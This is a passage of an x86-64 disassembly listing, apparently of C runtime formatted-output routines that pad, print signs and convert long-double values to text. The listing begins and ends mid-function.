   32c483950:	85 c0                	test   %eax,%eax
   32c483952:	7f ec                	jg     0x32c483940
   32c483954:	90                   	nop
   32c483955:	66 66 2e 0f 1f 84 00 	data16 cs nopw 0x0(%rax,%rax,1)
   32c48395c:	00 00 00 00 
   32c483960:	85 ed                	test   %ebp,%ebp
   32c483962:	0f 85 e8 01 00 00    	jne    0x32c483b50
   32c483968:	8b 53 08             	mov    0x8(%rbx),%edx
   32c48396b:	f6 c6 01             	test   $0x1,%dh
   32c48396e:	0f 85 5c 02 00 00    	jne    0x32c483bd0
   32c483974:	83 e2 40             	and    $0x40,%edx
   32c483977:	74 17                	je     0x32c483990
   32c483979:	48 89 da             	mov    %rbx,%rdx
   32c48397c:	b9 20 00 00 00       	mov    $0x20,%ecx
   32c483981:	e8 ba ec ff ff       	call   0x32c482640
   32c483986:	66 2e 0f 1f 84 00 00 	cs nopw 0x0(%rax,%rax,1)
   32c48398d:	00 00 00 
   32c483990:	8b 43 0c             	mov    0xc(%rbx),%eax
   32c483993:	85 c0                	test   %eax,%eax
   32c483995:	7e 15                	jle    0x32c4839ac
   32c483997:	8b 53 08             	mov    0x8(%rbx),%edx
   32c48399a:	81 e2 00 06 00 00    	and    $0x600,%edx
   32c4839a0:	81 fa 00 02 00 00    	cmp    $0x200,%edx
   32c4839a6:	0f 84 3c 02 00 00    	je     0x32c483be8
   32c4839ac:	85 ff                	test   %edi,%edi
   32c4839ae:	0f 8e b4 01 00 00    	jle    0x32c483b68
   32c4839b4:	90                   	nop
   32c4839b5:	66 66 2e 0f 1f 84 00 	data16 cs nopw 0x0(%rax,%rax,1)
   32c4839bc:	00 00 00 00 
   32c4839c0:	0f be 06             	movsbl (%rsi),%eax
   32c4839c3:	b9 30 00 00 00       	mov    $0x30,%ecx
   32c4839c8:	48 8d 56 01          	lea    0x1(%rsi),%rdx
   32c4839cc:	84 c0                	test   %al,%al
   32c4839ce:	0f 45 c8             	cmovne %eax,%ecx
   32c4839d1:	48 0f 45 f2          	cmovne %rdx,%rsi
   32c4839d5:	48 89 da             	mov    %rbx,%rdx
   32c4839d8:	e8 63 ec ff ff       	call   0x32c482640
   32c4839dd:	83 ef 01             	sub    $0x1,%edi
   32c4839e0:	74 76                	je     0x32c483a58
   32c4839e2:	f6 43 09 10          	testb  $0x10,0x9(%rbx)
   32c4839e6:	74 d8                	je     0x32c4839c0
   32c4839e8:	66 83 7b 20 00       	cmpw   $0x0,0x20(%rbx)
   32c4839ed:	74 d1                	je     0x32c4839c0
   32c4839ef:	69 c7 ab aa aa aa    	imul   $0xaaaaaaab,%edi,%eax
   32c4839f5:	3d 55 55 55 55       	cmp    $0x55555555,%eax
   32c4839fa:	77 c4                	ja     0x32c4839c0
   32c4839fc:	48 8d 4b 20          	lea    0x20(%rbx),%rcx
   32c483a00:	49 89 d8             	mov    %rbx,%r8
   32c483a03:	ba 01 00 00 00       	mov    $0x1,%edx
   32c483a08:	e8 a3 ec ff ff       	call   0x32c4826b0
   32c483a0d:	eb b1                	jmp    0x32c4839c0
   32c483a0f:	90                   	nop
   32c483a10:	41 c7 41 0c ff ff ff 	movl   $0xffffffff,0xc(%r9)
   32c483a17:	ff 
   32c483a18:	41 f6 41 09 10       	testb  $0x10,0x9(%r9)
   32c483a1d:	0f 84 3d ff ff ff    	je     0x32c483960
   32c483a23:	66 41 83 79 20 00    	cmpw   $0x0,0x20(%r9)
   32c483a29:	0f 84 31 ff ff ff    	je     0x32c483960
   32c483a2f:	41 8d 50 02          	lea    0x2(%r8),%edx
   32c483a33:	b8 ab aa aa aa       	mov    $0xaaaaaaab,%eax
   32c483a38:	b9 ff ff ff ff       	mov    $0xffffffff,%ecx
   32c483a3d:	48 0f af d0          	imul   %rax,%rdx
   32c483a41:	48 c1 ea 21          	shr    $0x21,%rdx
   32c483a45:	83 fa 01             	cmp    $0x1,%edx
   32c483a48:	0f 85 db fe ff ff    	jne    0x32c483929
   32c483a4e:	e9 0d ff ff ff       	jmp    0x32c483960
   32c483a53:	0f 1f 44 00 00       	nopl   0x0(%rax,%rax,1)
   32c483a58:	8b 43 10             	mov    0x10(%rbx),%eax
   32c483a5b:	85 c0                	test   %eax,%eax
   32c483a5d:	7f 19                	jg     0x32c483a78
   32c483a5f:	f6 43 09 08          	testb  $0x8,0x9(%rbx)
   32c483a63:	75 13                	jne    0x32c483a78
   32c483a65:	83 e8 01             	sub    $0x1,%eax
   32c483a68:	89 43 10             	mov    %eax,0x10(%rbx)
   32c483a6b:	48 83 c4 28          	add    $0x28,%rsp
   32c483a6f:	5b                   	pop    %rbx
   32c483a70:	5e                   	pop    %rsi
   32c483a71:	5f                   	pop    %rdi
   32c483a72:	5d                   	pop    %rbp
   32c483a73:	c3                   	ret
   32c483a74:	0f 1f 40 00          	nopl   0x0(%rax)
   32c483a78:	48 89 d9             	mov    %rbx,%rcx
   32c483a7b:	e8 e0 fc ff ff       	call   0x32c483760
   32c483a80:	eb 23                	jmp    0x32c483aa5
   32c483a82:	66 0f 1f 44 00 00    	nopw   0x0(%rax,%rax,1)
   32c483a88:	0f be 06             	movsbl (%rsi),%eax
   32c483a8b:	b9 30 00 00 00       	mov    $0x30,%ecx
   32c483a90:	48 8d 56 01          	lea    0x1(%rsi),%rdx
   32c483a94:	84 c0                	test   %al,%al
   32c483a96:	0f 45 c8             	cmovne %eax,%ecx
   32c483a99:	48 0f 45 f2          	cmovne %rdx,%rsi
   32c483a9d:	48 89 da             	mov    %rbx,%rdx
   32c483aa0:	e8 9b eb ff ff       	call   0x32c482640
   32c483aa5:	8b 43 10             	mov    0x10(%rbx),%eax
   32c483aa8:	8d 50 ff             	lea    -0x1(%rax),%edx
   32c483aab:	89 53 10             	mov    %edx,0x10(%rbx)
   32c483aae:	85 c0                	test   %eax,%eax
   32c483ab0:	7f d6                	jg     0x32c483a88
   32c483ab2:	48 83 c4 28          	add    $0x28,%rsp
   32c483ab6:	5b                   	pop    %rbx
   32c483ab7:	5e                   	pop    %rsi
   32c483ab8:	5f                   	pop    %rdi
   32c483ab9:	5d                   	pop    %rbp
   32c483aba:	c3                   	ret
   32c483abb:	0f 1f 44 00 00       	nopl   0x0(%rax,%rax,1)
   32c483ac0:	85 c0                	test   %eax,%eax
   32c483ac2:	0f 8e 68 01 00 00    	jle    0x32c483c30
   32c483ac8:	41 8b 51 10          	mov    0x10(%r9),%edx
   32c483acc:	83 e8 01             	sub    $0x1,%eax
   32c483acf:	39 c2                	cmp    %eax,%edx
   32c483ad1:	0f 8d 67 01 00 00    	jge    0x32c483c3e
   32c483ad7:	29 d0                	sub    %edx,%eax
   32c483ad9:	85 d2                	test   %edx,%edx
   32c483adb:	0f 8e af 01 00 00    	jle    0x32c483c90
   32c483ae1:	83 e8 01             	sub    $0x1,%eax
   32c483ae4:	41 89 41 0c          	mov    %eax,0xc(%r9)
   32c483ae8:	0f 1f 84 00 00 00 00 	nopl   0x0(%rax,%rax,1)
   32c483aef:	00 
   32c483af0:	85 c0                	test   %eax,%eax
   32c483af2:	0f 8e 68 fe ff ff    	jle    0x32c483960
   32c483af8:	85 ed                	test   %ebp,%ebp
   32c483afa:	0f 85 50 01 00 00    	jne    0x32c483c50
   32c483b00:	8b 53 08             	mov    0x8(%rbx),%edx
   32c483b03:	f7 c2 c0 01 00 00    	test   $0x1c0,%edx
   32c483b09:	0f 85 61 01 00 00    	jne    0x32c483c70
   32c483b0f:	80 e6 06             	and    $0x6,%dh
   32c483b12:	0f 85 78 fe ff ff    	jne    0x32c483990
   32c483b18:	83 e8 01             	sub    $0x1,%eax
   32c483b1b:	89 43 0c             	mov    %eax,0xc(%rbx)
   32c483b1e:	66 90                	xchg   %ax,%ax
   32c483b20:	48 89 da             	mov    %rbx,%rdx
   32c483b23:	b9 20 00 00 00       	mov    $0x20,%ecx
   32c483b28:	e8 13 eb ff ff       	call   0x32c482640
   32c483b2d:	8b 43 0c             	mov    0xc(%rbx),%eax
   32c483b30:	8d 50 ff             	lea    -0x1(%rax),%edx
   32c483b33:	89 53 0c             	mov    %edx,0xc(%rbx)
   32c483b36:	85 c0                	test   %eax,%eax
   32c483b38:	7f e6                	jg     0x32c483b20
   32c483b3a:	85 ed                	test   %ebp,%ebp
   32c483b3c:	0f 84 26 fe ff ff    	je     0x32c483968
   32c483b42:	0f 1f 00             	nopl   (%rax)
   32c483b45:	66 66 2e 0f 1f 84 00 	data16 cs nopw 0x0(%rax,%rax,1)
   32c483b4c:	00 00 00 00 
   32c483b50:	48 89 da             	mov    %rbx,%rdx
   32c483b53:	b9 2d 00 00 00       	mov    $0x2d,%ecx
   32c483b58:	e8 e3 ea ff ff       	call   0x32c482640
   32c483b5d:	e9 2e fe ff ff       	jmp    0x32c483990
   32c483b62:	66 0f 1f 44 00 00    	nopw   0x0(%rax,%rax,1)
   32c483b68:	48 89 da             	mov    %rbx,%rdx
   32c483b6b:	b9 30 00 00 00       	mov    $0x30,%ecx
   32c483b70:	e8 cb ea ff ff       	call   0x32c482640
   32c483b75:	8b 43 10             	mov    0x10(%rbx),%eax
   32c483b78:	85 c0                	test   %eax,%eax
   32c483b7a:	0f 8f 58 01 00 00    	jg     0x32c483cd8
   32c483b80:	f6 43 09 08          	testb  $0x8,0x9(%rbx)
   32c483b84:	0f 85 4e 01 00 00    	jne    0x32c483cd8
   32c483b8a:	85 ff                	test   %edi,%edi
   32c483b8c:	0f 84 d3 fe ff ff    	je     0x32c483a65
   32c483b92:	0f 1f 00             	nopl   (%rax)
   32c483b95:	66 66 2e 0f 1f 84 00 	data16 cs nopw 0x0(%rax,%rax,1)
   32c483b9c:	00 00 00 00 
   32c483ba0:	01 f8                	add    %edi,%eax
   32c483ba2:	89 43 10             	mov    %eax,0x10(%rbx)
   32c483ba5:	66 66 2e 0f 1f 84 00 	data16 cs nopw 0x0(%rax,%rax,1)
   32c483bac:	00 00 00 00 
   32c483bb0:	48 89 da             	mov    %rbx,%rdx
   32c483bb3:	b9 30 00 00 00       	mov    $0x30,%ecx
   32c483bb8:	e8 83 ea ff ff       	call   0x32c482640
   32c483bbd:	83 c7 01             	add    $0x1,%edi
   32c483bc0:	75 ee                	jne    0x32c483bb0
   32c483bc2:	e9 de fe ff ff       	jmp    0x32c483aa5
   32c483bc7:	66 0f 1f 84 00 00 00 	nopw   0x0(%rax,%rax,1)
   32c483bce:	00 00 
   32c483bd0:	48 89 da             	mov    %rbx,%rdx
   32c483bd3:	b9 2b 00 00 00       	mov    $0x2b,%ecx
   32c483bd8:	e8 63 ea ff ff       	call   0x32c482640
   32c483bdd:	e9 ae fd ff ff       	jmp    0x32c483990
   32c483be2:	66 0f 1f 44 00 00    	nopw   0x0(%rax,%rax,1)
   32c483be8:	83 e8 01             	sub    $0x1,%eax
   32c483beb:	89 43 0c             	mov    %eax,0xc(%rbx)
   32c483bee:	66 90                	xchg   %ax,%ax
   32c483bf0:	48 89 da             	mov    %rbx,%rdx
   32c483bf3:	b9 30 00 00 00       	mov    $0x30,%ecx
   32c483bf8:	e8 43 ea ff ff       	call   0x32c482640
   32c483bfd:	8b 43 0c             	mov    0xc(%rbx),%eax
   32c483c00:	8d 50 ff             	lea    -0x1(%rax),%edx
   32c483c03:	89 53 0c             	mov    %edx,0xc(%rbx)
   32c483c06:	85 c0                	test   %eax,%eax
   32c483c08:	7f e6                	jg     0x32c483bf0
   32c483c0a:	e9 9d fd ff ff       	jmp    0x32c4839ac
   32c483c0f:	90                   	nop
   32c483c10:	29 d0                	sub    %edx,%eax
   32c483c12:	85 d2                	test   %edx,%edx
   32c483c14:	7e 7a                	jle    0x32c483c90
   32c483c16:	83 e8 01             	sub    $0x1,%eax
   32c483c19:	41 8b 51 08          	mov    0x8(%r9),%edx
   32c483c1d:	41 89 41 0c          	mov    %eax,0xc(%r9)
   32c483c21:	e9 d3 fc ff ff       	jmp    0x32c4838f9
   32c483c26:	66 2e 0f 1f 84 00 00 	cs nopw 0x0(%rax,%rax,1)
   32c483c2d:	00 00 00 
   32c483c30:	75 0c                	jne    0x32c483c3e
   32c483c32:	41 8b 51 10          	mov    0x10(%r9),%edx
   32c483c36:	85 d2                	test   %edx,%edx
   32c483c38:	0f 88 b2 00 00 00    	js     0x32c483cf0
   32c483c3e:	c7 43 0c ff ff ff ff 	movl   $0xffffffff,0xc(%rbx)
   32c483c45:	e9 16 fd ff ff       	jmp    0x32c483960
   32c483c4a:	66 0f 1f 44 00 00    	nopw   0x0(%rax,%rax,1)
   32c483c50:	8d 50 ff             	lea    -0x1(%rax),%edx
   32c483c53:	89 53 0c             	mov    %edx,0xc(%rbx)
   32c483c56:	85 d2                	test   %edx,%edx
   32c483c58:	0f 84 f2 fe ff ff    	je     0x32c483b50
   32c483c5e:	f6 43 09 06          	testb  $0x6,0x9(%rbx)
   32c483c62:	0f 85 e8 fe ff ff    	jne    0x32c483b50
   32c483c68:	83 e8 02             	sub    $0x2,%eax
   32c483c6b:	e9 ab fe ff ff       	jmp    0x32c483b1b
   32c483c70:	8d 48 ff             	lea    -0x1(%rax),%ecx
   32c483c73:	89 4b 0c             	mov    %ecx,0xc(%rbx)
   32c483c76:	85 c9                	test   %ecx,%ecx
   32c483c78:	0f 84 ed fc ff ff    	je     0x32c48396b
   32c483c7e:	f6 c6 06             	test   $0x6,%dh
   32c483c81:	0f 85 e4 fc ff ff    	jne    0x32c48396b
   32c483c87:	eb df                	jmp    0x32c483c68
   32c483c89:	0f 1f 80 00 00 00 00 	nopl   0x0(%rax)
   32c483c90:	8b 53 08             	mov    0x8(%rbx),%edx
   32c483c93:	89 43 0c             	mov    %eax,0xc(%rbx)
   32c483c96:	f6 c6 08             	test   $0x8,%dh
   32c483c99:	75 25                	jne    0x32c483cc0
   32c483c9b:	85 ff                	test   %edi,%edi
   32c483c9d:	0f 8e 55 fe ff ff    	jle    0x32c483af8
   32c483ca3:	80 e6 10             	and    $0x10,%dh
   32c483ca6:	0f 84 4c fe ff ff    	je     0x32c483af8
   32c483cac:	66 83 7b 20 00       	cmpw   $0x0,0x20(%rbx)
   32c483cb1:	0f 85 56 fc ff ff    	jne    0x32c48390d
   32c483cb7:	e9 3c fe ff ff       	jmp    0x32c483af8
   32c483cbc:	0f 1f 40 00          	nopl   0x0(%rax)
   32c483cc0:	83 e8 01             	sub    $0x1,%eax
   32c483cc3:	89 43 0c             	mov    %eax,0xc(%rbx)
   32c483cc6:	85 ff                	test   %edi,%edi
   32c483cc8:	0f 8f 2b fc ff ff    	jg     0x32c4838f9
   32c483cce:	e9 1d fe ff ff       	jmp    0x32c483af0
   32c483cd3:	0f 1f 44 00 00       	nopl   0x0(%rax,%rax,1)
   32c483cd8:	48 89 d9             	mov    %rbx,%rcx
   32c483cdb:	e8 80 fa ff ff       	call   0x32c483760
   32c483ce0:	85 ff                	test   %edi,%edi
   32c483ce2:	0f 84 bd fd ff ff    	je     0x32c483aa5
   32c483ce8:	8b 43 10             	mov    0x10(%rbx),%eax
   32c483ceb:	e9 b0 fe ff ff       	jmp    0x32c483ba0
   32c483cf0:	89 d0                	mov    %edx,%eax
   32c483cf2:	f7 d8                	neg    %eax
   32c483cf4:	41 89 41 0c          	mov    %eax,0xc(%r9)
   32c483cf8:	41 f6 41 09 08       	testb  $0x8,0x9(%r9)
   32c483cfd:	0f 84 f5 fd ff ff    	je     0x32c483af8
   32c483d03:	89 d0                	mov    %edx,%eax
   32c483d05:	f7 d0                	not    %eax
   32c483d07:	41 89 41 0c          	mov    %eax,0xc(%r9)
   32c483d0b:	e9 e0 fd ff ff       	jmp    0x32c483af0
   32c483d10:	57                   	push   %rdi
   32c483d11:	56                   	push   %rsi
   32c483d12:	53                   	push   %rbx
   32c483d13:	48 83 ec 20          	sub    $0x20,%rsp
   32c483d17:	41 83 e8 01          	sub    $0x1,%r8d
   32c483d1b:	49 89 d3             	mov    %rdx,%r11
   32c483d1e:	41 89 ca             	mov    %ecx,%r10d
   32c483d21:	4c 89 cb             	mov    %r9,%rbx
   32c483d24:	49 63 f0             	movslq %r8d,%rsi
   32c483d27:	41 c1 f8 1f          	sar    $0x1f,%r8d
   32c483d2b:	48 69 d6 67 66 66 66 	imul   $0x66666667,%rsi,%rdx
   32c483d32:	48 c1 fa 22          	sar    $0x22,%rdx
   32c483d36:	44 29 c2             	sub    %r8d,%edx
   32c483d39:	41 b8 01 00 00 00    	mov    $0x1,%r8d
   32c483d3f:	74 3c                	je     0x32c483d7d
   32c483d41:	66 0f 1f 84 00 00 00 	nopw   0x0(%rax,%rax,1)
   32c483d48:	00 00 
   32c483d4a:	66 66 2e 0f 1f 84 00 	data16 cs nopw 0x0(%rax,%rax,1)
   32c483d51:	00 00 00 00 
   32c483d55:	66 66 2e 0f 1f 84 00 	data16 cs nopw 0x0(%rax,%rax,1)
   32c483d5c:	00 00 00 00 
   32c483d60:	48 63 c2             	movslq %edx,%rax
   32c483d63:	89 d1                	mov    %edx,%ecx
   32c483d65:	41 83 c0 01          	add    $0x1,%r8d
   32c483d69:	48 69 c0 67 66 66 66 	imul   $0x66666667,%rax,%rax
   32c483d70:	c1 f9 1f             	sar    $0x1f,%ecx
   32c483d73:	48 c1 f8 22          	sar    $0x22,%rax
   32c483d77:	29 c8                	sub    %ecx,%eax
   32c483d79:	89 c2                	mov    %eax,%edx
   32c483d7b:	75 e3                	jne    0x32c483d60
   32c483d7d:	8b 43 2c             	mov    0x2c(%rbx),%eax
   32c483d80:	83 f8 ff             	cmp    $0xffffffff,%eax
   32c483d83:	75 0c                	jne    0x32c483d91
   32c483d85:	c7 43 2c 02 00 00 00 	movl   $0x2,0x2c(%rbx)
   32c483d8c:	b8 02 00 00 00       	mov    $0x2,%eax
   32c483d91:	44 39 c0             	cmp    %r8d,%eax
   32c483d94:	44 89 c7             	mov    %r8d,%edi
   32c483d97:	8b 4b 0c             	mov    0xc(%rbx),%ecx
   32c483d9a:	49 89 d9             	mov    %rbx,%r9
   32c483d9d:	0f 4d f8             	cmovge %eax,%edi
   32c483da0:	41 b8 01 00 00 00    	mov    $0x1,%r8d
   32c483da6:	89 c8                	mov    %ecx,%eax
   32c483da8:	8d 57 02             	lea    0x2(%rdi),%edx
   32c483dab:	29 d0                	sub    %edx,%eax
   32c483dad:	39 d1                	cmp    %edx,%ecx
   32c483daf:	ba ff ff ff ff       	mov    $0xffffffff,%edx
   32c483db4:	44 89 d1             	mov    %r10d,%ecx
   32c483db7:	0f 4e c2             	cmovle %edx,%eax
   32c483dba:	4c 89 da             	mov    %r11,%rdx
   32c483dbd:	89 43 0c             	mov    %eax,0xc(%rbx)
   32c483dc0:	e8 eb fa ff ff       	call   0x32c4838b0
   32c483dc5:	8b 4b 08             	mov    0x8(%rbx),%ecx
   32c483dc8:	8b 43 2c             	mov    0x2c(%rbx),%eax
   32c483dcb:	48 89 da             	mov    %rbx,%rdx
   32c483dce:	89 43 10             	mov    %eax,0x10(%rbx)
   32c483dd1:	89 c8                	mov    %ecx,%eax
   32c483dd3:	83 e1 20             	and    $0x20,%ecx
   32c483dd6:	0d c0 01 00 00       	or     $0x1c0,%eax
   32c483ddb:	83 c9 45             	or     $0x45,%ecx
   32c483dde:	89 43 08             	mov    %eax,0x8(%rbx)
   32c483de1:	e8 5a e8 ff ff       	call   0x32c482640
   32c483de6:	8d 47 01             	lea    0x1(%rdi),%eax
   32c483de9:	01 43 0c             	add    %eax,0xc(%rbx)
   32c483dec:	48 89 da             	mov    %rbx,%rdx
   32c483def:	48 89 f1             	mov    %rsi,%rcx
   32c483df2:	48 83 c4 20          	add    $0x20,%rsp
   32c483df6:	5b                   	pop    %rbx
   32c483df7:	5e                   	pop    %rsi
   32c483df8:	5f                   	pop    %rdi
   32c483df9:	e9 62 ec ff ff       	jmp    0x32c482a60
   32c483dfe:	66 90                	xchg   %ax,%ax
   32c483e00:	56                   	push   %rsi
   32c483e01:	53                   	push   %rbx
   32c483e02:	48 83 ec 58          	sub    $0x58,%rsp
   32c483e06:	44 8b 42 10          	mov    0x10(%rdx),%r8d
   32c483e0a:	db 29                	fldt   (%rcx)
   32c483e0c:	48 89 d3             	mov    %rdx,%rbx
   32c483e0f:	45 85 c0             	test   %r8d,%r8d
   32c483e12:	78 5c                	js     0x32c483e70
   32c483e14:	41 83 c0 01          	add    $0x1,%r8d
   32c483e18:	48 8d 44 24 48       	lea    0x48(%rsp),%rax
   32c483e1d:	b9 02 00 00 00       	mov    $0x2,%ecx
   32c483e22:	48 8d 54 24 30       	lea    0x30(%rsp),%rdx
   32c483e27:	db 7c 24 30          	fstpt  0x30(%rsp)
   32c483e2b:	4c 8d 4c 24 4c       	lea    0x4c(%rsp),%r9
   32c483e30:	48 89 44 24 20       	mov    %rax,0x20(%rsp)
   32c483e35:	e8 06 e7 ff ff       	call   0x32c482540
   32c483e3a:	44 8b 44 24 4c       	mov    0x4c(%rsp),%r8d
   32c483e3f:	8b 4c 24 48          	mov    0x48(%rsp),%ecx
   32c483e43:	48 89 c6             	mov    %rax,%rsi
   32c483e46:	41 81 f8 00 80 ff ff 	cmp    $0xffff8000,%r8d
   32c483e4d:	74 31                	je     0x32c483e80
   32c483e4f:	49 89 d9             	mov    %rbx,%r9
   32c483e52:	48 89 c2             	mov    %rax,%rdx
   32c483e55:	e8 b6 fe ff ff       	call   0x32c483d10
   32c483e5a:	48 89 f1             	mov    %rsi,%rcx
   32c483e5d:	e8 be 13 00 00       	call   0x32c485220
   32c483e62:	90                   	nop
   32c483e63:	48 83 c4 58          	add    $0x58,%rsp
   32c483e67:	5b                   	pop    %rbx
   32c483e68:	5e                   	pop    %rsi
   32c483e69:	c3                   	ret
   32c483e6a:	66 0f 1f 44 00 00    	nopw   0x0(%rax,%rax,1)
   32c483e70:	c7 42 10 06 00 00 00 	movl   $0x6,0x10(%rdx)
   32c483e77:	41 b8 07 00 00 00    	mov    $0x7,%r8d
   32c483e7d:	eb 99                	jmp    0x32c483e18
   32c483e7f:	90                   	nop
   32c483e80:	49 89 d8             	mov    %rbx,%r8
   32c483e83:	48 89 c2             	mov    %rax,%rdx
   32c483e86:	e8 45 eb ff ff       	call   0x32c4829d0
   32c483e8b:	48 89 f1             	mov    %rsi,%rcx
   32c483e8e:	e8 8d 13 00 00       	call   0x32c485220
   32c483e93:	90                   	nop
   32c483e94:	48 83 c4 58          	add    $0x58,%rsp
   32c483e98:	5b                   	pop    %rbx
   32c483e99:	5e                   	pop    %rsi
   32c483e9a:	c3                   	ret
   32c483e9b:	0f 1f 44 00 00       	nopl   0x0(%rax,%rax,1)
   32c483ea0:	56                   	push   %rsi
   32c483ea1:	53                   	push   %rbx
   32c483ea2:	48 83 ec 58          	sub    $0x58,%rsp
   32c483ea6:	44 8b 42 10          	mov    0x10(%rdx),%r8d
   32c483eaa:	db 29                	fldt   (%rcx)
   32c483eac:	48 89 d3             	mov    %rdx,%rbx
   32c483eaf:	45 85 c0             	test   %r8d,%r8d
   32c483eb2:	79 0d                	jns    0x32c483ec1
   32c483eb4:	c7 42 10 06 00 00 00 	movl   $0x6,0x10(%rdx)
   32c483ebb:	41 b8 06 00 00 00    	mov    $0x6,%r8d
   32c483ec1:	48 8d 44 24 48       	lea    0x48(%rsp),%rax
   32c483ec6:	b9 03 00 00 00       	mov    $0x3,%ecx
   32c483ecb:	48 8d 54 24 30       	lea    0x30(%rsp),%rdx
   32c483ed0:	db 7c 24 30          	fstpt  0x30(%rsp)
   32c483ed4:	4c 8d 4c 24 4c       	lea    0x4c(%rsp),%r9
   32c483ed9:	48 89 44 24 20       	mov    %rax,0x20(%rsp)
   32c483ede:	e8 5d e6 ff ff       	call   0x32c482540
   32c483ee3:	44 8b 44 24 4c       	mov    0x4c(%rsp),%r8d
   32c483ee8:	8b 4c 24 48          	mov    0x48(%rsp),%ecx
   32c483eec:	48 89 c6             	mov    %rax,%rsi
   32c483eef:	41 81 f8 00 80 ff ff 	cmp    $0xffff8000,%r8d
   32c483ef6:	74 68                	je     0x32c483f60
   32c483ef8:	48 89 c2             	mov    %rax,%rdx
   32c483efb:	49 89 d9             	mov    %rbx,%r9
   32c483efe:	e8 ad f9 ff ff       	call   0x32c4838b0
   32c483f03:	8b 43 0c             	mov    0xc(%rbx),%eax
   32c483f06:	eb 1c                	jmp    0x32c483f24
   32c483f08:	0f 1f 84 00 00 00 00 	nopl   0x0(%rax,%rax,1)
   32c483f0f:	00 
   32c483f10:	48 63 43 24          	movslq 0x24(%rbx),%rax
   32c483f14:	c6 04 02 20          	movb   $0x20,(%rdx,%rax,1)
   32c483f18:	8b 53 24             	mov    0x24(%rbx),%edx
   32c483f1b:	8b 43 0c             	mov    0xc(%rbx),%eax
   32c483f1e:	83 c2 01             	add    $0x1,%edx
   32c483f21:	89 53 24             	mov    %edx,0x24(%rbx)
   32c483f24:	89 c2                	mov    %eax,%edx
   32c483f26:	83 e8 01             	sub    $0x1,%eax
   32c483f29:	89 43 0c             	mov    %eax,0xc(%rbx)
   32c483f2c:	85 d2                	test   %edx,%edx
   32c483f2e:	7e 3b                	jle    0x32c483f6b
   32c483f30:	8b 4b 08             	mov    0x8(%rbx),%ecx
   32c483f33:	f6 c5 40             	test   $0x40,%ch
   32c483f36:	75 08                	jne    0x32c483f40
   32c483f38:	8b 53 24             	mov    0x24(%rbx),%edx
   32c483f3b:	39 53 28             	cmp    %edx,0x28(%rbx)
   32c483f3e:	7e de                	jle    0x32c483f1e
   32c483f40:	48 8b 13             	mov    (%rbx),%rdx
   32c483f43:	80 e5 20             	and    $0x20,%ch
   32c483f46:	74 c8                	je     0x32c483f10
   32c483f48:	b9 20 00 00 00       	mov    $0x20,%ecx
   32c483f4d:	e8 2e 45 00 00       	call   0x32c488480
   32c483f52:	8b 53 24             	mov    0x24(%rbx),%edx
   32c483f55:	8b 43 0c             	mov    0xc(%rbx),%eax
   32c483f58:	eb c4                	jmp    0x32c483f1e
   32c483f5a:	66 0f 1f 44 00 00    	nopw   0x0(%rax,%rax,1)
   32c483f60:	49 89 d8             	mov    %rbx,%r8
   32c483f63:	48 89 c2             	mov    %rax,%rdx
   32c483f66:	e8 65 ea ff ff       	call   0x32c4829d0
   32c483f6b:	48 89 f1             	mov    %rsi,%rcx
   32c483f6e:	e8 ad 12 00 00       	call   0x32c485220
   32c483f73:	90                   	nop
   32c483f74:	48 83 c4 58          	add    $0x58,%rsp
   32c483f78:	5b                   	pop    %rbx
   32c483f79:	5e                   	pop    %rsi
   32c483f7a:	c3                   	ret
   32c483f7b:	0f 1f 44 00 00       	nopl   0x0(%rax,%rax,1)
   32c483f80:	56                   	push   %rsi
   32c483f81:	53                   	push   %rbx
   32c483f82:	48 83 ec 68          	sub    $0x68,%rsp
   32c483f86:	44 8b 42 10          	mov    0x10(%rdx),%r8d
   32c483f8a:	db 29                	fldt   (%rcx)
   32c483f8c:	48 89 d3             	mov    %rdx,%rbx
   32c483f8f:	45 85 c0             	test   %r8d,%r8d
   32c483f92:	0f 88 f0 00 00 00    	js     0x32c484088
   32c483f98:	0f 84 d2 00 00 00    	je     0x32c484070
   32c483f9e:	48 8d 44 24 58       	lea    0x58(%rsp),%rax
   32c483fa3:	48 8d 54 24 40       	lea    0x40(%rsp),%rdx
   32c483fa8:	b9 02 00 00 00       	mov    $0x2,%ecx
   32c483fad:	db 7c 24 40          	fstpt  0x40(%rsp)
   32c483fb1:	4c 8d 4c 24 5c       	lea    0x5c(%rsp),%r9
   32c483fb6:	48 89 44 24 20       	mov    %rax,0x20(%rsp)
   32c483fbb:	e8 80 e5 ff ff       	call   0x32c482540
   32c483fc0:	44 8b 44 24 5c       	mov    0x5c(%rsp),%r8d
   32c483fc5:	44 8b 54 24 58       	mov    0x58(%rsp),%r10d
   32c483fca:	48 89 c6             	mov    %rax,%rsi
   32c483fcd:	41 81 f8 00 80 ff ff 	cmp    $0xffff8000,%r8d
   32c483fd4:	0f 84 c6 00 00 00    	je     0x32c4840a0
   32c483fda:	8b 43 08             	mov    0x8(%rbx),%eax
   32c483fdd:	25 00 08 00 00       	and    $0x800,%eax
   32c483fe2:	41 83 f8 fd          	cmp    $0xfffffffd,%r8d
   32c483fe6:	7c 58                	jl     0x32c484040
   32c483fe8:	8b 53 10             	mov    0x10(%rbx),%edx
   32c483feb:	41 39 d0             	cmp    %edx,%r8d
   32c483fee:	7f 50                	jg     0x32c484040
   32c483ff0:	85 c0                	test   %eax,%eax
   32c483ff2:	0f 84 f0 00 00 00    	je     0x32c4840e8
   32c483ff8:	44 29 c2             	sub    %r8d,%edx
   32c483ffb:	89 53 10             	mov    %edx,0x10(%rbx)
   32c483ffe:	49 89 d9             	mov    %rbx,%r9
   32c484001:	48 89 f2             	mov    %rsi,%rdx
   32c484004:	44 89 d1             	mov    %r10d,%ecx
   32c484007:	e8 a4 f8 ff ff       	call   0x32c4838b0
   32c48400c:	eb 0f                	jmp    0x32c48401d
   32c48400e:	66 90                	xchg   %ax,%ax
   32c484010:	48 89 da             	mov    %rbx,%rdx
   32c484013:	b9 20 00 00 00       	mov    $0x20,%ecx
   32c484018:	e8 23 e6 ff ff       	call   0x32c482640
   32c48401d:	8b 43 0c             	mov    0xc(%rbx),%eax
   32c484020:	8d 50 ff             	lea    -0x1(%rax),%edx
   32c484023:	89 53 0c             	mov    %edx,0xc(%rbx)
   32c484026:	85 c0                	test   %eax,%eax
   32c484028:	7f e6                	jg     0x32c484010
   32c48402a:	48 89 f1             	mov    %rsi,%rcx
   32c48402d:	e8 ee 11 00 00       	call   0x32c485220
   32c484032:	90                   	nop
   32c484033:	48 83 c4 68          	add    $0x68,%rsp
   32c484037:	5b                   	pop    %rbx
   32c484038:	5e                   	pop    %rsi
   32c484039:	c3                   	ret
   32c48403a:	66 0f 1f 44 00 00    	nopw   0x0(%rax,%rax,1)
   32c484040:	85 c0                	test   %eax,%eax
